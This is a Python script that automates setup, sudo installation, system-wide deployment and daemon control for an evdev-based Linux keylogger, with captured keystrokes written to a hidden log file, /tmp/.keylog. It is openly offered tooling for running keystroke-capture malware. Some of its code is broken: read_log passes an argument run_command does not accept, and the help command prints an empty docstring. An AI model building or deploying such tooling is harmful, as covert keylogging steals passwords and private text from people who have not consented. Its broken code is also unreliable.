#!/usr/bin/env python3
# _*_ coding: utf8 _*_
# ------------------------------------------------------------------------------
# keylogger_orchestrator.py - Orchestration script for the Linux keylogger
#                             (evdev-based) project.
#
# This script manages the entire lifecycle:
#   - Prerequisite installation (via install.sh)
#   - Environment verification (via configure)
#   - Compilation (make)
#   - Installation (make install)
#   - Runtime control (start, stop, status, read logs)
#
# Usage:
#   python3 keylogger_orchestrator.py [command]
#
# Commands:
#   setup      - Run install.sh and configure (full preparation)
#   build      - Compile the keylogger (make)
#   install    - Install the binary system-wide (make install)
#   start      - Start the keylogger daemon (make run)
#   stop       - Stop the daemon (make stop)
#   status     - Show daemon status (make status)
#   read       - Show the log (make read)
#   clean      - Clean build artifacts (make clean)
#   all        - Run setup, build, and install (full chain)
#   menu       - Interactive menu (default if no command given)
#   help       - Show this help
# ------------------------------------------------------------------------------

import os
import sys
import subprocess
import shutil
import time
import argparse
import signal
from pathlib import Path

# ------------------------------------------------------------------------------
# Colours for terminal output
# ------------------------------------------------------------------------------
class Colours:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    BOLD = '\033[1m'
    NC = '\033[0m'  # No Colour

def info(msg):    print(f"{Colours.BLUE}[INFO]{Colours.NC} {msg}")
def ok(msg):      print(f"{Colours.GREEN}[ OK ]{Colours.NC} {msg}")
def warn(msg):    print(f"{Colours.YELLOW}[WARN]{Colours.NC} {msg}")
def error(msg):   print(f"{Colours.RED}[ERROR]{Colours.NC} {msg}")

# ------------------------------------------------------------------------------
# Utility functions
# ------------------------------------------------------------------------------
def run_command(cmd, cwd=None, check=True, capture=False):
    """Run a shell command and return its output/status."""
    info(f"Running: {' '.join(cmd)}")
    try:
        if capture:
            result = subprocess.run(cmd, cwd=cwd, check=check, text=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return result.stdout.strip(), result.stderr.strip()
        else:
            subprocess.run(cmd, cwd=cwd, check=check)
            return None, None
    except subprocess.CalledProcessError as e:
        error(f"Command failed with exit code {e.returncode}: {' '.join(cmd)}")
        if e.stderr:
            print(e.stderr)
        raise
    except FileNotFoundError:
        error(f"Command not found: {cmd[0]}")
        raise

def file_exists(path):
    return Path(path).is_file()

def dir_exists(path):
    return Path(path).is_dir()

def require_file(path, description):
    if not file_exists(path):
        error(f"Required file missing: {path} ({description})")
        sys.exit(1)

def require_dir(path, description):
    if not dir_exists(path):
        error(f"Required directory missing: {path} ({description})")
        sys.exit(1)

def check_sudo():
    """Check if sudo is available and the user can run it."""
    if shutil.which('sudo') is None:
        warn("sudo not found; you may need to run commands as root manually.")
        return False
    # Try a dummy sudo command
    try:
        subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError:
        return False

# ------------------------------------------------------------------------------
# Core orchestration actions
# ------------------------------------------------------------------------------
class Orchestrator:
    def __init__(self, base_dir=None):
        self.base_dir = base_dir or os.getcwd()
        # Paths to our scripts and files
        self.install_script = os.path.join(self.base_dir, 'install.sh')
        self.configure_script = os.path.join(self.base_dir, 'configure')
        self.makefile = os.path.join(self.base_dir, 'Makefile')
        self.source = os.path.join(self.base_dir, 'keylogger.c')
        self.binary = os.path.join(self.base_dir, 'keylogger')
        self.config_mk = os.path.join(self.base_dir, 'config.mk')

    def check_prerequisites(self):
        """Verify that all expected files exist."""
        required_files = [
            (self.source, "source code"),
            (self.makefile, "Makefile"),
            (self.install_script, "install script"),
            (self.configure_script, "configure script"),
        ]
        for fpath, desc in required_files:
            require_file(fpath, desc)
        ok("All required files are present.")

    def setup(self):
        """Run install.sh and configure."""
        info("Starting full setup (prerequisites + configure)...")
        self.check_prerequisites()

        # 1. Run install.sh (needs sudo)
        if not check_sudo():
            warn("install.sh requires sudo to install packages and add user to group.")
            answer = input("Do you want to continue with sudo? (y/N) ").strip().lower()
            if answer != 'y':
                warn("Skipping install.sh. You may need to run it manually later.")
            else:
                run_command(['sudo', 'bash', self.install_script])
                ok("install.sh completed.")
        else:
            run_command(['sudo', 'bash', self.install_script])
            ok("install.sh completed.")

        # 2. Run configure (no sudo needed)
        run_command(['bash', self.configure_script])
        ok("configure completed.")

        ok("Setup finished. You can now build with 'make'.")

    def build(self):
        """Compile the keylogger using make."""
        info("Building the keylogger...")
        if not file_exists(self.makefile):
            error("Makefile not found. Run setup first.")
            sys.exit(1)
        run_command(['make'], cwd=self.base_dir)
        if file_exists(self.binary):
            ok(f"Build successful. Binary: {self.binary}")
        else:
            error("Build failed; binary not generated.")
            sys.exit(1)

    def install(self):
        """Run make install (requires sudo)."""
        info("Installing keylogger system-wide...")
        if not file_exists(self.binary):
            error("Binary not found. Run build first.")
            sys.exit(1)
        if not check_sudo():
            answer = input("make install requires sudo. Continue? (y/N) ").strip().lower()
            if answer != 'y':
                warn("Installation aborted.")
                return
        run_command(['sudo', 'make', 'install'], cwd=self.base_dir)
        ok("Installation completed.")

    def start(self):
        """Start the daemon (make run)."""
        info("Starting keylogger daemon...")
        if not file_exists(self.binary):
            error("Binary not found. Build first.")
            sys.exit(1)
        # Run make run, which uses sudo if needed
        run_command(['make', 'run'], cwd=self.base_dir)
        ok("Keylogger started. Log: /tmp/.keylog")

    def stop(self):
        """Stop the daemon (make stop)."""
        info("Stopping keylogger daemon...")
        run_command(['make', 'stop'], cwd=self.base_dir)
        ok("Keylogger stopped.")

    def status(self):
        """Show status (make status)."""
        info("Checking keylogger status...")
        run_command(['make', 'status'], cwd=self.base_dir)

    def read_log(self, lines=20):
        """Show log (make read)."""
        info(f"Reading last {lines} lines of log...")
        env = os.environ.copy()
        env['LINES'] = str(lines)
        run_command(['make', 'read'], cwd=self.base_dir, env=env)

    def clean(self):
        """Clean build artifacts (make clean)."""
        info("Cleaning build artifacts...")
        run_command(['make', 'clean'], cwd=self.base_dir)
        ok("Clean completed.")

    def full_chain(self):
        """Run setup, build, install."""
        info("Running full chain: setup -> build -> install")
        self.setup()
        self.build()
        self.install()
        ok("Full chain completed successfully.")

# ------------------------------------------------------------------------------
# Interactive menu
# ------------------------------------------------------------------------------
def interactive_menu(orch):
    """Show a text-based menu and loop until exit."""
    while True:
        print("\n" + "=" * 60)
        print(f"{Colours.BOLD}Keylogger Orchestrator Menu{Colours.NC}")
        print("=" * 60)
        print("1. Setup (install prerequisites + configure)")
        print("2. Build (compile)")
        print("3. Install (system-wide)")
        print("4. Start daemon")
        print("5. Stop daemon")
        print("6. Status")
        print("7. Read log (last 20 lines)")
        print("8. Clean")
        print("9. Full chain (setup + build + install)")
        print("0. Exit")
        choice = input("Enter your choice: ").strip()

        if choice == '1':
            orch.setup()
        elif choice == '2':
            orch.build()
        elif choice == '3':
            orch.install()
        elif choice == '4':
            orch.start()
        elif choice == '5':
            orch.stop()
        elif choice == '6':
            orch.status()
        elif choice == '7':
            orch.read_log()
        elif choice == '8':
            orch.clean()
        elif choice == '9':
            orch.full_chain()
        elif choice == '0':
            info("Exiting.")
            break
        else:
            warn("Invalid choice. Please enter a number from 0 to 9.")
        # Pause before showing menu again
        input("\nPress Enter to continue...")

# ------------------------------------------------------------------------------
# Command-line argument parsing
# ------------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="Orchestrate the Linux keylogger project.",
        epilog="If no command is given, interactive menu is launched."
    )
    parser.add_argument(
        'command',
        nargs='?',
        choices=['setup', 'build', 'install', 'start', 'stop', 'status',
                 'read', 'clean', 'all', 'help'],
        help="Action to perform"
    )
    parser.add_argument(
        '--lines',
        type=int,
        default=20,
        help="Number of log lines to show (used with 'read')"
    )
    parser.add_argument(
        '--dir',
        default=os.getcwd(),
        help="Base directory of the project (default: current)"
    )
    return parser.parse_args()

# ------------------------------------------------------------------------------
# Main
# ------------------------------------------------------------------------------
def main():
    args = parse_args()
    orch = Orchestrator(base_dir=args.dir)

    # Change to the project directory if needed
    if args.dir != os.getcwd():
        os.chdir(args.dir)
        info(f"Changed working directory to {args.dir}")

    # If no command, launch interactive menu
    if args.command is None:
        interactive_menu(orch)
        return

    # Execute the requested command
    try:
        if args.command == 'setup':
            orch.setup()
        elif args.command == 'build':
            orch.build()
        elif args.command == 'install':
            orch.install()
        elif args.command == 'start':
            orch.start()
        elif args.command == 'stop':
            orch.stop()
        elif args.command == 'status':
            orch.status()
        elif args.command == 'read':
            orch.read_log(lines=args.lines)
        elif args.command == 'clean':
            orch.clean()
        elif args.command == 'all':
            orch.full_chain()
        elif args.command == 'help':
            print(__doc__)
        else:
            error(f"Unknown command: {args.command}")
            sys.exit(1)
    except KeyboardInterrupt:
        info("Interrupted by user.")
        sys.exit(0)
    except Exception as e:
        error(f"Unhandled exception: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
